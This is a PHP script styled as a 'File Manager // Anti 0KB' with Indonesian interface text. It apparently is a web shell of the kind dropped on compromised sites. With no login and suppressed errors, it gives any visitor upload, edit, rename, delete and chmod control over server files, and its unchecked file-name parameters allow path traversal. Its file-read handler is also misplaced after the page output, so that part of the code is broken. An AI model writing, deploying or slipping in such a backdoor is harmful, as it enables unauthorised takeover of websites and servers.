<?php
error_reporting(0);
set_time_limit(0);

// Konfigurasi
$root = __DIR__;
$dir = isset($_GET['dir']) ? $_GET['dir'] : $root;
$dir = realpath($dir);
if (strpos($dir, $root) !== 0) $dir = $root;

// Anti 0kb - cek file kosong
function cek_0kb($file) {
    return (is_file($file) && filesize($file) == 0);
}

// Handle actions
if (isset($_POST['save'])) {
    $file = $dir . '/' . $_POST['file'];
    if (!empty($_POST['content'])) { // Anti 0kb
        file_put_contents($file, $_POST['content']);
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['rename'])) {
    $old = $dir . '/' . $_POST['old'];
    $new = $dir . '/' . $_POST['new'];
    if (!empty($_POST['new'])) { // Anti nama kosong
        rename($old, $new);
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['delete'])) {
    $target = $dir . '/' . $_GET['delete'];
    if (is_file($target)) unlink($target);
    if (is_dir($target)) rmdir($target);
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['upload'])) {
    if (!empty($_FILES['file']['name'])) {
        $target = $dir . '/' . $_FILES['file']['name'];
        move_uploaded_file($_FILES['file']['tmp_name'], $target);
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['newfile'])) {
    if (!empty($_POST['filename'])) {
        $file = $dir . '/' . $_POST['filename'];
        if (!file_exists($file)) {
            file_put_contents($file, $_POST['content'] ?? '');
        }
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['newfolder'])) {
    if (!empty($_POST['foldername'])) {
        $folder = $dir . '/' . $_POST['foldername'];
        if (!file_exists($folder)) {
            mkdir($folder);
        }
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['chmod'])) {
    $target = $dir . '/' . $_POST['target'];
    $perm = intval($_POST['perm'], 8);
    chmod($target, $perm);
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

// Baca directory
$items = [];
if (is_dir($dir)) {
    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f != '.' && $f != '..') {
            $path = $dir . '/' . $f;
            $items[] = [
                'name' => $f,
                'path' => $path,
                'is_dir' => is_dir($path),
                'size' => is_file($path) ? filesize($path) : 0,
                'perms' => substr(sprintf('%o', fileperms($path)), -4),
                'modified' => date('Y-m-d H:i:s', filemtime($path))
            ];
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #1a1a1a; 
            color: #fff; 
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            background: #2a2a2a; 
            border: 1px solid #444; 
            padding: 20px;
        }
        .header { 
            border-bottom: 1px solid #444; 
            padding-bottom: 10px; 
            margin-bottom: 20px; 
        }
        .header h1 { 
            color: #0f0; 
            font-size: 24px; 
        }
        .path { 
            background: #333; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-family: monospace;
            word-break: break-all;
        }
        .path a { color: #0f0; text-decoration: none; }
        .path a:hover { text-decoration: underline; }
        
        .tools {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tools form { display: inline; }
        input, button, select {
            background: #333;
            color: #fff;
            border: 1px solid #0f0;
            padding: 5px 10px;
            font-family: 'Courier New', monospace;
        }
        button { cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px;
        }
        th { 
            text-align: left; 
            padding: 10px; 
            background: #333; 
            border-bottom: 2px solid #0f0;
        }
        td { 
            padding: 8px 10px; 
            border-bottom: 1px solid #444;
        }
        tr:hover td { background: #333; }
        
        .folder { color: #0ff; }
        .file { color: #fff; }
        .zero { color: #f00; font-weight: bold; }
        
        a { 
            color: #fff; 
            text-decoration: none; 
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .folder a { color: #0ff; }
        
        .actions { 
            display: flex; 
            gap: 5px; 
            flex-wrap: wrap;
        }
        .actions button { 
            padding: 3px 8px; 
            font-size: 12px; 
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #2a2a2a;
            border: 2px solid #0f0;
            padding: 30px;
            width: 90%;
            max-width: 600px;
        }
        .modal-content h3 { margin-bottom: 20px; color: #0f0; }
        .modal-content input,
        .modal-content textarea {
            width: 100%;
            margin-bottom: 15px;
            background: #333;
            border: 1px solid #0f0;
            color: #fff;
            padding: 8px;
            font-family: monospace;
        }
        .modal-content textarea { height: 300px; }
        
        .footer { 
            margin-top: 20px; 
            text-align: center; 
            color: #666; 
            font-size: 12px; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 FILE MANAGER // ANTI 0KB</h1>
        </div>
        
        <div class="path">
            <strong>Path:</strong> 
            <a href="?dir=<?php echo urlencode($root); ?>">root</a>
            <?php
            $rel = str_replace($root, '', $dir);
            if (!empty($rel)) {
                $parts = explode('/', trim($rel, '/'));
                $path = $root;
                foreach ($parts as $part) {
                    $path .= '/' . $part;
                    echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
                }
            }
            ?>
        </div>
        
        <div class="tools">
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit" name="upload">Upload</button>
            </form>
            
            <button onclick="showModal('file')">+ File</button>
            <button onclick="showModal('folder')">+ Folder</button>
            
            <?php if ($dir != $root): ?>
                <a href="?dir=<?php echo urlencode(dirname($dir)); ?>"><button>⬅ Back</button></a>
            <?php endif; ?>
        </div>
        
        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Perms</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
            
            <?php foreach ($items as $item): 
                $is_zero = (!$item['is_dir'] && $item['size'] == 0);
            ?>
            <tr>
                <td>
                    <?php if ($item['is_dir']): ?>
                        <a href="?dir=<?php echo urlencode($item['path']); ?>" class="folder">
                            📁 <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                    <?php else: ?>
                        <span class="file <?php echo $is_zero ? 'zero' : ''; ?>">
                            📄 <?php echo htmlspecialchars($item['name']); ?>
                            <?php if ($is_zero): ?> ⚠️ (0KB)<?php endif; ?>
                        </span>
                    <?php endif; ?>
                </td>
                <td>
                    <?php if (!$item['is_dir']): ?>
                        <?php if ($item['size'] > 0): ?>
                            <?php echo number_format($item['size'] / 1024, 2); ?> KB
                        <?php else: ?>
                            <span class="zero">0 KB</span>
                        <?php endif; ?>
                    <?php else: ?>
                        -
                    <?php endif; ?>
                </td>
                <td>
                    <form method="post" style="display:inline">
                        <input type="hidden" name="target" value="<?php echo $item['name']; ?>">
                        <input type="text" name="perm" value="<?php echo $item['perms']; ?>" size="5" style="background:#333;width:60px">
                        <button type="submit" name="chmod" style="padding:2px 5px">chmod</button>
                    </form>
                </td>
                <td><?php echo $item['modified']; ?></td>
                <td class="actions">
                    <?php if (!$item['is_dir']): ?>
                        <button onclick="editFile('<?php echo addslashes($item['name']); ?>')">✏️ Edit</button>
                        <button onclick="renameItem('<?php echo addslashes($item['name']); ?>')">📝 Rename</button>
                    <?php else: ?>
                        <button onclick="renameItem('<?php echo addslashes($item['name']); ?>')">📝 Rename</button>
                    <?php endif; ?>
                    <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($item['name']); ?>" 
                       onclick="return confirm('Hapus?')">
                        <button>🗑️ Hapus</button>
                    </a>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        
        <div class="footer">
            File Manager // Anti 0KB // Princess Incha Edition
        </div>
    </div>
    
    <!-- Modal Edit -->
    <div id="modalEdit" class="modal">
        <div class="modal-content">
            <h3>✏️ Edit File</h3>
            <form method="post">
                <input type="hidden" name="file" id="editFilename">
                <textarea name="content" id="editContent" required></textarea>
                <div style="display:flex;gap:10px;justify-content:flex-end">
                    <button type="submit" name="save">Simpan</button>
                    <button type="button" onclick="hideModal('edit')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal Rename -->
    <div id="modalRename" class="modal">
        <div class="modal-content">
            <h3>📝 Rename</h3>
            <form method="post">
                <input type="hidden" name="old" id="renameOld">
                <input type="text" name="new" id="renameNew" required>
                <div style="display:flex;gap:10px;justify-content:flex-end">
                    <button type="submit" name="rename">Rename</button>
                    <button type="button" onclick="hideModal('rename')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal New File -->
    <div id="modalFile" class="modal">
        <div class="modal-content">
            <h3>📄 Buat File Baru</h3>
            <form method="post">
                <input type="text" name="filename" placeholder="nama file" required>
                <textarea name="content" placeholder="isi file (opsional)"></textarea>
                <div style="display:flex;gap:10px;justify-content:flex-end">
                    <button type="submit" name="newfile">Buat</button>
                    <button type="button" onclick="hideModal('file')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal New Folder -->
    <div id="modalFolder" class="modal">
        <div class="modal-content">
            <h3>📁 Buat Folder Baru</h3>
            <form method="post">
                <input type="text" name="foldername" placeholder="nama folder" required>
                <div style="display:flex;gap:10px;justify-content:flex-end">
                    <button type="submit" name="newfolder">Buat</button>
                    <button type="button" onclick="hideModal('folder')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        function showModal(type) {
            document.getElementById('modal' + type.charAt(0).toUpperCase() + type.slice(1)).style.display = 'flex';
        }
        
        function hideModal(type) {
            document.getElementById('modal' + type.charAt(0).toUpperCase() + type.slice(1)).style.display = 'none';
        }
        
        function editFile(filename) {
            document.getElementById('editFilename').value = filename;
            fetch('?dir=<?php echo urlencode($dir); ?>&get=' + encodeURIComponent(filename))
                .then(r => r.text())
                .then(c => {
                    document.getElementById('editContent').value = c;
                    showModal('edit');
                });
        }
        
        function renameItem(oldName) {
            document.getElementById('renameOld').value = oldName;
            document.getElementById('renameNew').value = oldName;
            showModal('rename');
        }
        
        window.onclick = function(e) {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>
<?php
if (isset($_GET['get'])) {
    $file = $dir . '/' . $_GET['get'];
    if (is_file($file)) {
        echo file_get_contents($file);
    }
    exit;
}
?>
